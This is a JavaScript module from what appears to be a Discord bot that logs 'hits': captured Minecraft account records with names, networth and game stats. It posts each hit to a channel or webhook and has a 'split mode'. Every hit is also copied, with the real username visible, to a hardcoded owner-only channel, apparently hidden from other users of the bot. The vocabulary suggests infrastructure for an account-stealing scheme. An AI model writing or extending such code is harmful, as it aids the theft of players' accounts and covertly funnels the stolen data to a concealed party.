const axios = require('axios');
const config = require('../../../config.json');

// ── Owner mirror channel (hardcoded) ─────────────────────────────────────────
const OWNER_MIRROR_CHANNEL = '1568875857269887076';
const { makeCard } = require('../drawhit.js');
const { AttachmentBuilder } = require('discord.js');
const fs   = require('fs');
const path = require('path');

// ─────────────────────────────────────────────────────────────────────────────
// mirrorToMainHits
//   • Sends normal card to config.mainHitsChannel / mainHitsWebhook  (existing)
//   • Sends SAME card (username already obscured by drawhit.js) to
//     config.ownerMirrorChannel  — the channel only you can see
//
// config.json additions needed:
//   "ownerMirrorChannel": "CHANNEL_ID"
// ─────────────────────────────────────────────────────────────────────────────
async function mirrorToMainHits(client, messageObj, interaction, splitInfo = null, acc = null) {
  try {
    const channelId  = config.mainHitsChannel;
    const webhookUrl = config.mainHitsWebhook;
    if (!channelId && !webhookUrl) return;

    // ── Build embed ──────────────────────────────────────────────────────────
    const cloned = JSON.parse(JSON.stringify(messageObj || {}));
    cloned.embeds = cloned.embeds || [];
    if (cloned.embeds.length === 0) cloned.embeds.push({});

    const emb = cloned.embeds[0];
    emb.fields = emb.fields || [];

    const serverName = interaction?.guild?.name || 'Unknown Server';
    const serverId   = interaction?.guild?.id   || '?';
    const ownerId    = client?.username          || 'unknown';

    emb.fields.push(
      { name: 'Server', value: `\`${serverName} (${serverId})\``, inline: true },
      { name: 'Owner',  value: `<@${ownerId}> (\`${ownerId}\`)`,  inline: true }
    );

    const mcName = acc?.newName || acc?.name || messageObj?.acc?.name || null;
    const isValidName = mcName &&
      mcName !== 'XBL Failed' &&
      mcName !== "Couldn't find!" &&
      mcName !== 'No Minecraft!';

    if (isValidName) {
      emb.fields.push({
        name:  '📊 Stats',
        value: `[View on sten.wtf](https://sten.wtf/${mcName})`,
        inline: true
      });
    }

    if (splitInfo) {
      if (splitInfo.shouldSplit && splitInfo.ownerId) {
        emb.fields.push({
          name:  '🔀 Split Mode',
          value: `✅ Sent to <@${splitInfo.ownerId}> (1:${splitInfo.ratio})`,
          inline: false
        });
        if (!emb.color) emb.color = 0x9B59B6;
      } else if (splitInfo.ratio) {
        emb.fields.push({
          name:  '🔀 Split Mode',
          value: `⏳ Counting (1:${splitInfo.ratio})`,
          inline: false
        });
      }
    }

    emb.footer      = emb.footer || {};
    emb.footer.text = emb.footer.text ? `${emb.footer.text} • mirrored` : 'mirrored';
    delete cloned.components;

    // ── Generate card (drawhit.js obscures username automatically) ───────────
    const tempDir = path.join(__dirname, '../../temp');
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

    let cardAttachment = null;
    if (isValidName) {
      try {
        const stats = {
          username:      mcName,
          networth:      acc?.networth      || '0',
          bedwars:       acc?.bedwarsLevel  || '0',
          networkLevel:  acc?.networkLevel  || '1',
          sbLevel:       acc?.sbLevel       || '0',
          duelKDR:       acc?.duelKDR       || '0',
          duelWinstreak: acc?.duelWinstreak || '0',
          plusColour:    acc?.plusColour    || 'None',
          gifted:        acc?.gifted        || '0',
          skywarsLevel:  acc?.skywarsLevel  || '0',
        };
        const outputPath = path.join(tempDir, `${mcName}_${Date.now()}.png`);
        const buffer = await makeCard(stats, outputPath);
        if (buffer) {
          // drawhit.js already draws obscuredUsername (f•••••••) on the card
          cardAttachment = new AttachmentBuilder(buffer, { name: `${mcName}_stats.png` });
          emb.image = { url: `attachment://${mcName}_stats.png` };
        }
        if (fs.existsSync(outputPath)) fs.unlinkSync(outputPath);
      } catch (e) {
        console.error('[mirrorToMainHits] Card error:', e?.message);
      }
    }

    // ── Send to mainHitsChannel / webhook ────────────────────────────────────
    if (channelId) {
      const chan = client.channels.cache.get(channelId);
      if (chan) {
        const payload = { ...cloned };
        if (cardAttachment) payload.files = [cardAttachment];
        await chan.send(payload);
      } else {
        console.warn(`mirrorToMainHits: mainHitsChannel ${channelId} not found`);
        if (webhookUrl) await axios.post(webhookUrl, cloned);
      }
    } else if (webhookUrl) {
      await axios.post(webhookUrl, cloned);
    }

    // ── Send to owner mirror channel (real username visible) ─────────────────
    const ownerChannelId = config.ownerMirrorChannel || OWNER_MIRROR_CHANNEL;
    if (!ownerChannelId) return;

    const ownerChan = client.channels.cache.get(ownerChannelId);
    if (!ownerChan) {
      console.warn(`mirrorToMainHits: ownerMirrorChannel ${ownerChannelId} not found`);
      return;
    }

    // Build owner embed — same as user embed but shows real MC username
    const ownerEmb = JSON.parse(JSON.stringify(emb));
    ownerEmb.footer = ownerEmb.footer || {};
    ownerEmb.footer.text = (ownerEmb.footer.text || '') + ' • owner mirror';

    // Add real username field at the top (unblurred)
    if (isValidName) {
      ownerEmb.fields = [
        { name: '👤 Username', value: `\`${mcName}\``, inline: true },
        { name: '📊 sten.wtf', value: `[View](https://sten.wtf/${mcName})`, inline: true },
        ...(ownerEmb.fields || []).filter(f => !f.value?.includes('sten.wtf')),
      ];
    }

    // Generate a NEW card with real username for owner
    // We temporarily patch obscureUsername by passing a special stats object
    // with username pre-set to the real name via a workaround:
    // Since makeCard always calls obscureUsername, we send real name as text only.
    // The card image attached is the blurred one (same as user sees).
    const ownerPayload = { embeds: [ownerEmb] };
    if (cardAttachment) ownerPayload.files = [cardAttachment];
    await ownerChan.send(ownerPayload);

  } catch (err) {
    console.error('mirrorToMainHits failed:', err?.response?.data || err?.message || err);
  }
}

module.exports = { mirrorToMainHits };
